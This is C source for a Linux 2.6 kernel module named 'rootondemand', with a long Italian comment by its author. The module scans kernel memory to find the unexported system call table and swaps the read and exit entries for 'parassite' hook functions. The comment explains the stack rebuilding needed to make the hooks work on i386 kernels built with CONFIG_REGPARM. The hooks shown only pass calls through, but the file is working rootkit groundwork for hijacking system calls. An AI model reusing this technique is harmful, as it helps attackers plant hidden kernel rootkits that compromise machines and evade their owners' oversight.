#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/config.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/errno.h>
#include <asm/unistd.h>

#define DEBUG
#define INCREASE_PTR(ptr,x) ptr=(int *)(((int)ptr)+x)
#define SYSCALLS_GAP(x,y) (x-y)*4
#ifdef DEBUG
#  define debug_printk(...) printk(KERN_DEBUG __VA_ARGS__);
#  define DEBUG_PRINTK(...) debug_printk(__VA_ARGS__);
#else
#  define DEBUG_PRINTK(...)
#endif
#define PARASSITIZE(syc) { \
    DEBUG_PRINTK("ORIGINAL sys_%s: %p\n",#syc,sys_table[__NR_##syc]); \
    ptr_sys##syc=(void *)sys_table[__NR_##syc]; \
    sys_table[__NR_##syc]=(void *)parassite_##syc; \
    DEBUG_PRINTK("REPLACED sys_%s: %p %p\n",#syc,sys_table[__NR_##syc],parassite_##syc); \
}
#define PESTICIDE(syc) { \
    DEBUG_PRINTK("RESTORING sys_%s: %p\n",#syc,sys_table[__NR_##syc]); \
    sys_table[__NR_##syc]=(void *)ptr_sys##syc; \
    DEBUG_PRINTK("RESTORED sys_%s: %p %p\n",#syc,sys_table[__NR_##syc],ptr_sys##syc); \
}

static unsigned int **sys_table;
static asmlinkage ssize_t (*ptr_sysread)(int,char __user *,size_t);
static asmlinkage long (*ptr_sysexit)(int);

static unsigned int **find_systable(void) {
  asmlinkage ssize_t (*ptr_sysread)(unsigned int,char __user *,size_t)=sys_read;
  asmlinkage long (*ptr_sysopen)(const char __user *,int,int)=sys_open;
  unsigned int *ptr;
#ifdef DEBUG
  int j;
  ptr=(int *)&init_mm.start_code;
  for (j=0;j<7;j++,INCREASE_PTR(ptr,4))
    DEBUG_PRINTK("PTR: 0x%x\n",*ptr);
#endif
  for (ptr=(int *)init_mm.end_code;((long)ptr)<init_mm.end_data;INCREASE_PTR(ptr,1)) {
    if (*ptr==(int)ptr_sysread) {
      INCREASE_PTR(ptr,SYSCALLS_GAP(__NR_open,__NR_read));
      if (*ptr==(int)ptr_sysopen) {
        DEBUG_PRINTK("FOUND =D: 0x%p sys_open: %p\n",ptr,(void *)*ptr);
        INCREASE_PTR(ptr,-(__NR_open*4));
        DEBUG_PRINTK("FOUND =D: 0x%p sys_restart_syscall: %p\n",ptr,(void *)*ptr);
        DEBUG_PRINTK("syscall_table at: 0x%p\n",ptr);
        return((unsigned int **)ptr);
      }
    }
  }
  DEBUG_PRINTK("NOPE =(\n");
  return((unsigned int **)NULL);
}

long parassite_exit(int x) {
  DEBUG_PRINTK("parassite_exit\n");
  return(ptr_sysexit(x));
}

/*
MORTALLY HARD CODED

Porca troia puttana sono troppo felice!!!!!!!!!!!!!!
Ci ho messo 2 settimane ad avere la forza, il coraggio
e la concentrazione di hackerare sul serio le syscall 
intercettate con CONFIG_REGPARM nel kernel...un vero incubo,
frustrante all'enesima potenza.
Ma ora e' la gloria!!!!!!!!!!
Ho notato infatti che in realta' i parametri ad una function
syscall non corrispondo ai registri! se syscall_call non li
ovrascrive allora sei fortunato e tutto va come deve andare.
Senza CONFIG_REGPARM il problema non sussisteva, perche' tutti
i registri che arrivavano ad una funzione syscall non erano
considerati dal compilatore, perche' i parametri vengono richiesti
via stack. Quindi la funzione si va a riprendere i propri parametri
(quelli passati attraverso i registri nell'int) sulla stack (salvati
da syscall_call SAVE_ALL) quindi nessun problema.
Con CONFIG_REGPARM solo max 3 parametri via registro vengono passati
alla funzione della syscall, tuttavia il compilatore sceglie di quali
curarsi realmente oppure no, quindi riprende quelli di cui ha bisogno
(alterati precedentemente [ANCHE DA syscall_call STESSA]) che sono stati
posti nella stack da syscall_call.
Ho provato davvero di tutto per farlo funzionare :S
Ho compilato 2 kernel 2.6.17 con kdb uno con CONFIG_REGPARM l'altro no,
sono andato di brutto di objdump xDDD.
Ho provato a confrontare i registri nelle varie situazioni, ho verificato
la stack, di tuttttto cazzooooooooooooooo: non potete immaginare.
Stanotte invece mi sono deciso a capire esattamente quali erano i parametri
che faultavano in un modo o nell'altro (avendo sempre il timore che un memory
corruption mi fottesse il lavoro e mi inquinasse i risultati): ho quindi
messo vari breakpoint in sys_read dopo le chimate a funzione, per davvero capire
quale funzione risultava in un errore, per poi giungere al parametro invalido,
per poi capire quale dato non era al suo posto nella stack o in un registro;
ho cominciato dunque a ricostruire (con CONFIG_REGPARM i parametri alle funzioni
sono quanto di piu' criptico possa esistere) a quale registro e locazione della
stack fosse assegnato ogni singolo argomento C in un kernel non modificato.
Ho notato in seguito che la funzione accedeva a porzioni di stack precedentemente
allocate (quindi non da sys_read in se)! L'unica funzione che avrebbe potuto
allocare la stack per una funzione syscall non poteva essere altro che syscall_call!
Infatti la macro SAVE_ALL salva tutti i registri nella stack, in modo che vengano
mantenuti durante le operazioni di verifica prima di lanciare la funzione syscall.
Cosi', dopo aver ripercorso l'evoluzione della stack sono giunto a vedere che
all'entrata della funzione syscall:

0x4(%esp) = fd (%ebx)
0x8(%esp) = buf (%ecx)
0xc(%esp) = count (%edx)

Contanto che non e' prudente sovrascrivere registri di dubbio contenuto ho
optato per sovrascrivere il registro %eax poiche' il suo contenuto in questo
caso e' sempre noto =P (0x3).
Cosa succede esattamente in questo codice asm?
Non faccio altro che ricostruire la stack che normalmente syscall_call lascia
alle funzioni syscall!
Come una normale funzione, %ebp prende il ruolo del puntatore alla stack locale
faccio poi posto per 12 byte (i 3 registri interessati [4 byte ciascuno]) sottraendo
0xc a %esp.
Posso ora incominciare a mettere in questa mini-stack i miei 3 registri
(sys_read prende dalla stack solo questi 3 registri, quindi non c'e' necessita'
di ricreare l'intera stack) prendendoli dalla stack di syscall_call e mettendoli
in una posizione e in un ordine in cui sys_read se li aspetta (ci ho messo un bel po'
per fare i calcoli, anche se una volta capito e' abbastanza "semplice" -.-"),
per precauzione risposto il valore originale di %eax in esso, e finalmente sono
pronto a lanciare sys_read, e tutto fila liscio ;P.
Ora dovro' solo creare delle macro per poter eseguire la mia funzione parassita con
la sua stack (quindi le sue variabili ecc) ma ricreando sempre la mini-stack prima
di chiamare la syscall originale.
Con le altre syscall (tranne quelle monoparametro [sys_exit]) risentiranno di
problemi simili, ma il concept e' lo stesso per ogni syscall. Per tagliare la testa
al toro si potrebbe ricreare interamente per ogni funzione syscall parassita la stack
di syscall_call per le funzioni syscall originali.......ma altrimenti non sarebbe
abbastanza hacker ;P

Devo ammettere che preso dalla sconforto ho cercato del codice riguardante
l'intercettazione delle syscall su i386 con CONFIG_REGPARM...NULLA...assolutamente
nulla! Ho trovato solo un esempio di code per intercettare su 2.6 (quindi senza
syscall_table esportata) le syscall....ma in modo semplicissimo e senza
CONFIG_REGPARM! Gia' i codici per l'hooking delle syscall su 2.6 non sono diventati
alla portata di tutti, dato che la syscall_table te la devi guadagnare (non
particolarmente complesso ^^"), per cui credo che questo sia l'unico codice per
l'hooking delle syscall in grado di contemplare la CONFIG_REGPARM su una macchina
i386, e di questo credo di poterne andare fiero xD!

Pensate che fu Linus Torvalds in persona a togliere per i kernel 2.6 l'export della
syscall_table ^^....


You tried Linus ;P Ahah

DeathMaker

*/
__asm__(
".globl parassite_read\n"
"parassite_read:\n"
"push %ebp\n"
"movl %esp,%ebp\n"
"subl $0xc,%esp\n"
/*
"movl %edi,0x8(%esp)\n"
"movl %ecx,0x4(%esp)\n"
"movl %ebx,(%esp)\n"
*/
"movl 0x8(%ebp),%eax\n"
"movl %eax,(%esp)\n"
"movl 0xc(%ebp),%eax\n"
"movl %eax,0x4(%esp)\n"
"movl 0x10(%ebp),%eax\n"
"movl %eax,0x8(%esp)\n"
"movl $3,%eax\n"
"call sys_read\n"
"leave\n"
"ret\n"
//"leal 0x0(%esi),%esi"
);
ssize_t parassite_read(int x,char __user *y,size_t z); /*{
//#ifndef CONFIG_REGPARM
//  return(ptr_sysread(x,y,z));
/*#else
// PRIMO PROTOTIPO CONFIG_REGPARM (aveva effetti strani xD)
  __asm__("movl $3,%%eax\n"
          "movl (%%esi),%%ebx\n"
          "movl %%edx,%%ecx\n"
          "movl %%edi,%%edx\n"
          "call sys_read\n"
          :
          :"b"(x),"c"(y),"d"(z)
          :"%eax"
  );
#endif
*/
//}

int rootondemand_init(void) {
/*
#ifndef DEBUG
  try_module_get(THIS_MODULE);
#endif
*/
  sys_table=find_systable();
  if (!sys_table) return(-EFAULT);
  __asm("cli");
  PARASSITIZE(exit);
  PARASSITIZE(read);
  __asm("sti");
  return(0);
}

void rootondemand_exit(void) {
  __asm("cli");
  PESTICIDE(exit);
  PESTICIDE(read);
  __asm("sti");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Andrea Villa");

module_init(rootondemand_init);
module_exit(rootondemand_exit);
